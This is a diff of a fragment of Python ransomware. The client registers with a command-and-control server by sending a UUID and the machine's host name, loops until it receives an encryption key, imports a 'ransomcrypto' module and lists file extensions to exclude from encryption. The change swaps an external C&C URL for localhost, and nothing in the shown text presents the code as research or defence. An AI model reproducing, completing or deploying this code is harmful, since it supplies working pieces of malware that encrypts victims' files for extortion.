@@ -1,13 +1,16 @@
 # get a KEY from the C&C server
 
 import requests, uuid, os
+from ransomcrypto import *
+
+
 UUID = uuid.uuid4()
 host_name = os.environ['COMPUTERNAME']
 encryption_key = ""
 
 # register with C&C server
 while encryption_key == "":
-    url = 'http://commandandcontrol.netai.net/register.php'
+    url = 'http://localhost:8000/register'
     payload = {'uuid': UUID, 'host': host_name}
 
     r = requests.get(url, params=payload)
@@ -17,7 +20,7 @@ while encryption_key == "":
     else:
         pass
 
-from ransomcrypto import *
+
 
 excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
 
